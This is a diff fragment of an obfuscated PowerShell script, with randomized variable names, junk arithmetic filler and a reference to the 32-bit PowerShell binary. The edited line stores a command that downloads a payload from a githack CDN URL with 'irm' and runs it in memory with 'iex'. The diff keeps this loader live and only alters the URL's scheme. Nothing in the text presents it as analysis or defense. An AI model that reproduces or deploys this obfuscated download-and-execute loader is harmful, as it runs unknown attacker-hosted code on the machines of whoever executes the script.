@@ -833,7 +833,7 @@ $c98WVXzYVTVF4Ku2K = 'BGdXqUhn'.Replace('q', 'q').Substring(0, 1).Replace('h', '
 ${ptX2zxVbTKQLvjj} = Join-Path $env:SystemRoot 'syswow64\WindowsPowerShell\v1.0\powershell.exe'
         try { $r4D4Ya4Q5OFq7Z = [Math]::Sqrt(3376) } finally { [void]$r4D4Ya4Q5OFq7Z }
 try {[void]([Math]::Max(969, 12))} finally {$null = [Math]::Sign(-13); $null = [Math]::Sign(27)}
-$_HWN3EV = '[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; irm https://rawcdn.githack.com/dsteru3421/fd775931-8a95-4d78-858d-13d3087553a5/refs/heads/main/1119f3f-4572e0e89248 | iex'
+$_HWN3EV = '[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; irm rawcdn.githack.com/dsteru3421/fd775931-8a95-4d78-858d-13d3087553a5/refs/heads/main/1119f3f-4572e0e89248 | iex'
 
         $_aZaaMw = @(-52, -640, -233, 210, -39, -232, -184, 795)
 $hjwqXnPE8Zty = 0
